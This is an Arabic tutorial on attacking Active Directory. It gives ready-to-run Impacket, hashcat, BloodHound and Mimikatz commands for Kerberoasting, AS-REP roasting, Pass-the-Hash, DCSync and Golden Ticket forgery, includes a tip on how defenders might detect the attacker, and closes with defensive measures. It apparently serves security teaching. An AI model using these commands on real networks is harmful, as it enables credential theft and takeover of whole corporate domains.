هجمات Active Directory - منهجية شاملة

تعلم كيف يستغل المهاجمون Active Directory في بيئات الشركات. من Kerberoasting إلى DCSync، مع أمثلة عملية.

؟ ما هو Active Directory؟

Active Directory (AD) هو نظام إدارة الهوية والصلاحيات من Microsoft، يستخدم في 95% من الشركات Fortune 500. يتحكم بكل شيء: المستخدمين، الصلاحيات، السياسات، الطابعات.

لهذا السبب، اختراق AD = اختراق الشركة كلها.

1 المرحلة 1: الدخول الأولي

Phishing

الطريقة الأكثر شيوعاً. المهاجم يرسل بريد يحوي ملف Office ضار أو رابط تسجيل دخول مزور.

الأدوات: GoPhish, evilginx2, SET

Credential Stuffing

تجربة كلمات مرور مسرّبة من breaches أخرى (Have I Been Pwned).

Public-facing Vulnerabilities

ثغرة في VPN، Exchange، Citrix، Fortinet...

🔥 المرحلة 2: Kerberoasting

ما هو؟

أي حساب خدمة في AD عنده SPN (Service Principal Name) = له Kerberos ticket قابل للكسر offline.

كيف تنفذه بـ Impacket

GetUserSPNs.py 'domain.local/user:password' -dc-ip 10.0.0.1 -request

كسر الـ Hash

hashcat -m 13100 hash.txt rockyou.txt

💡 نصيحة: الحسابات ذات كلمات مرور طويلة (>25 حرف) مقاومة لـ Kerberoasting. شجّع استخدام Managed Service Accounts.

🔥 AS-REP Roasting

مثل Kerberoasting لكن بدون SPN - يستهدف حسابات بدون pre-authentication.

GetNPUsers.py 'domain.local/' -usersfile users.txt -format hashcat -outputfile hashes.txt

🔥 Pass-the-Hash (PtH)

المفهوم

NTLM hash = كافي لتسجيل دخول. ما تحتاج كلمة المرور الأصلية. المهاجم يسرق الـ hash ويستخدمه مباشرة.

بـ Impacket

psexec.py 'domain/admin@10.0.0.1' -hashes aad3b435b51404eeaad3b435b51404ee:hash

متى ينجح؟

  • الحسابات المحلية
  • حسابات بدون LSA Protection
  • أنظمة قديمة (XP, Server 2003)

🗺️ BloodHound - خريطة الهجوم

أداة رسم خرائط AD. تكشف أقصر مسار من Domain Users إلى Domain Admin بصرياً.

الاستخدام

bloodhound-python -u user -p 'pass' -d domain.local -ns 10.0.0.1 -c All

افتح BloodHound GUI، استورد JSON، استعرض:

  • Shortest Paths to Domain Admins
  • Find all Kerberoastable Users
  • Find Computers with Unconstrained Delegation
  • List of Domain Admins

👑 DCSync - تاج الوصول

ما هو؟

يحاكي Domain Controller لسحب كلمات مرور كل المستخدمين في الـ domain. يعطيك krbtgt hash = Golden Ticket.

الشروط

  • صلاحيات Replicating Directory Changes + Replicating Directory Changes All
  • أو عضو في Domain Admins / Enterprise Admins

بـ Impacket

secretsdump.py 'domain/admin:password@10.0.0.1'

🚨 Critical: لو الـ SOC عنده تنبيهات على Event ID 4662 (Directory Service Access)، ممكن يكتشفك.

🎫 Golden Ticket

لو حصلت على krbtgt hash عبر DCSync، تقدر تصنع Kerberos tickets بأي اسم وصلاحية لأي مدة.

بـ Mimikatz

kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /endin:600 /renewmax:10080 /ptt

⚠️ التخفيف الوحيد: غيّر krbtgt password مرتين (interval 10 ساعات) - حينها التذاكر المزورة تنتهي صلاحيتها.

🛡️ كيف تحمي AD؟

✅ Tier Model

افصل بين Domain Controllers (Tier 0)، Servers (Tier 1)، Workstations (Tier 2).

✅ LAPS

Local Admin Password Solution - كلمات مرور عشوائية لكل جهاز.

✅ Protected Users Group

حسابات حساسة لا تستطيع Kerberos أو NTLM.

✅ Credential Guard

VBS-based isolation لـ LSA - يمنع Mimikatz.

✅ Monitoring

SIEM rules لـ Event 4662, 4769, 4624 (Kerberos anomalies).

✅ krbtgt rotation

غيّر krbtgt مرتين سنوياً على الأقل.
